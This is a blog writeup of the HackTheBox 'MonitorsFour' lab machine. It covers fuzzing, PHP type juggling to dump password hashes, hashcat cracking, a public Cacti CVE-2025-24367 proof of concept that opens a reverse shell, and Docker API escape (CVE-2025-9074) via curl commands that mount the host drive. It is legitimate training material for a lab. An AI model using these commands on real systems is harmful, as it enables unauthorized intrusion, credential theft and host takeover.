---
author: "amir_rabiee"
pubDatetime: 2025-12-10T15:46:45.51
title: "HTB - Monitorsfour Machine Writeup"
featured: false
draft: false
archived: false
tags:
  - hackthebox
  - writeup
  - cve
  - fuzzing
description: "Not so 'Easy'"
---

## Table of Contents

## Introduction

In this article, I document my first proper CTF experience on the HackTheBox platform. This machine was part of the weekly Seasonal event, though I didn't get a chance to participate in the competition on time - it was the second-to-last one. Despite being labeled "Easy"... it wasn't that simple. HTB machines are generally a level above other platforms, and Seasonal machines are even harder than usual. Also, since this was a live machine, there were naturally no writeups or solutions available on the internet or YouTube for guidance - making this at least medium difficulty for me.

This seemingly simple machine taught many important concepts: fuzzing and enumeration, finding relevant CVEs, password cracking, getting RCE, and overall chaining different attacks to achieve privilege escalation.

Fun fact: both CVEs used in this CTF were from 2025 :))

### Connecting to HackTheBox Machines

For those who haven't participated in HackTheBox yet or just started... there are two ways to connect to machines. You can either use a graphical connection to an Attack Machine (which is essentially a pre-configured ParrotOS) or direct connection to the target machine's network via OpenVPN.

It's more reasonable to connect via OpenVPN and interact with the target IP comfortably in our own environment. Additionally, the platform's Attack Machine has time limitations on the free plan, requiring a subscription for unlimited access.

So what's the problem? The problem is that Iran's filtering system drops OpenVPN connections. I don't have a specific solution worth writing a separate post about, so I'll summarize it here briefly.

Try different ISPs - some have fewer restrictions. Also test all servers and use UDP protocol.

For me, it worked on Samantel ISP + Singapore servers.

The connection process itself is explained on the platform and is straightforward.

## Reconnaissance

### nmap
First step as always... see what services are running on this IP...
```bash
nmap 10.10.11.98
```

An nmap scan revealed WinRM and nginx running. The presence of WinRM hints that the host is likely using Windows Linux Subsystem for another service.

A wget request shows it redirects to monitorsfour.htb, and since this domain naturally won't resolve via DNS, we need to add it to the system's hosts file:
```bash
echo "10.10.11.98 monitorsfour.htb" >> /etc/hosts
```

Now we see a landing page with some about/login pages.

Later, after many manual payload attempts and sqlmap, I concluded the login form isn't vulnerable to SQLi :)

### Fuzzing

I performed directory fuzzing on the domain:
```bash
ffuf -w /usr/share/seclists/Discovery/Web-Content/raft-medium-words.txt -u http://monitorsfour.htb/FUZZ -mc all -fc 404,400
```

Results showed accessible paths: users, user, login, admin, and .env

It was ridiculous that .env was left exposed like that :)) but ultimately it wasn't very useful:
```
DB_HOST=mariadb
DB_PORT=3306
DB_NAME=monitorsfour_db
DB_USER=monitorsdbuser
DB_PASS=f*********
```

#### PHP Type Juggling

Requesting `/users` returned `missing token`. Adding a value for `?token` gave `invalid or missing token`. Since we know the environment uses PHP 8.3.27, we can exploit Type Juggling. In PHP, comparison with `==` leads to type conversion during comparison, unlike `===`.
```bash
ffuf -c -u http://monitorsfour.htb/user?token=FUZZ -w php_loose_comparison.txt -fw 4
```

With another fuzzing round, we try to find a suitable value for Type Juggling. The value 0 works, and tokens likely start with 0e which, when converted to integer, is treated as scientific notation, making 0 == 0.0 ultimately true.
```bash
curl http://monitorsfour.htb/users?token=0
```

This returned all users with their password hashes :))

#### hashcat
The admin user is more interesting. Examining the password hash, we identify it as MD5 and attempt to crack it with hashcat and the rockyou wordlist:
```bash
hashcat -m 0 56b32eb43e6f15395f6c46c1c9e1cd36 /usr/share/wordlists/rockyou.txt
```

It cracks easily. Password: wonderful1

Also worth mentioning, in the user details we obtained, alongside the username, the admin's full name was Marcus Higgins.

I logged into the admin panel with these credentials. There was a very important detail in the panel. In their changelog, they mentioned using Docker 4.44.2. This Docker version has a CVE: [CVE-2025-9074](https://nvd.nist.gov/vuln/detail/CVE-2025-9074)

#### vhost Fuzzing

With further investigation, I realized other puzzle pieces were elsewhere and our work here was almost done. Another fuzzing round on vhosts yielded interesting results:
```bash
ffuf -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-5000.txt -u http://monitorsfour.htb -H "Host:FUZZ.monitorsfour.htb" -fs 4 -ac
```

- Note: using the -ac flag is important

Result: `cacti [Status: 302]`

Now we know there's a Cacti instance served on `cacti.monitorsfour.htb` and we open the address. (Remember to add this to /etc/hosts too)

I tried logging in with admin and the password wonderful1, which didn't work. But we can guess the username from previous information - it belongs to Marcus Higgins, so we try combinations. marcus:wonderful1 worked and we logged into Cacti.

## RCE - Cacti 1.2.28

This Cacti version has a new CVE: [CVE-2025-24367](https://nvd.nist.gov/vuln/detail/CVE-2025-24367)

A simple search found a PoC that gives us RCE. Here's the repo with more details: [CVE-2025-24367-Cacti-PoC](https://github.com/TheCyberGeek/CVE-2025-24367-Cacti-PoC)
```bash
python3 poc.py -u marcus -p wonderful1 -i 10.10.14.147 -l 1234 -url http://cacti.monitorsfour.htb
```

Before running this, we need an nc listener on port 1234:
```bash
nc -lvnp 1234
```

Now we got a reverse shell. Checking the hostname reveals we're inside a Docker container with ID: 821fbd6a43fa

### User flag

At this point, navigating to /home allows us to read user.txt and obtain the user flag. Halfway done.

## Privilege Escalation

As mentioned earlier, CVE-2025-9074 (Docker API Escape) allows us to communicate with Docker's internal interface and create a new container with the Windows C:/ drive mounted in volumes.

This Docker API is at `http://192.168.65.7:2375/` which we'll exploit.

First, check available Docker images:
```bash
curl http://192.168.65.7:2375/images/json
```

Create a privileged container:
```bash
curl -X POST http://192.168.65.7:2375/containers/create?name=pwn2 \
  -H "Content-Type: application/json" \
  -d '{"Image":"alpine:latest","Cmd":["/bin/sh","-c","while true; do sleep 3600; done"],"HostConfig":{"Privileged":true,"Binds":["/run/desktop/mnt/host/c:/host"]}}'
```

Start the container (use the NEW container ID from response, not 821fbd6a43fa):
```bash
curl -X POST http://192.168.65.7:2375/containers/NEW_CONTAINER_ID/start
```

### Root flag

Get an Exec ID:
```bash
curl -X POST http://192.168.65.7:2375/containers/NEW_CONTAINER_ID/exec \
  -H "Content-Type: application/json" \
  -d '{"AttachStdout":true,"AttachStderr":true,"Cmd":["cat","/host/Users/Administrator/Desktop/root.txt"]}'
```

Now start the Exec_ID like this to get the root flag :))
```bash
curl -X POST http://192.168.65.7:2375/exec/EXEC_ID/start -H "Content-Type: application/json" -d '{"Detach":false,"Tty":false}'
```

And done. The Docker stage took longer than I want to admit because I wasn't familiar with Docker's internal systems, and the key was getting the Exec ID and executing commands. But it summarizes to just these few lines.
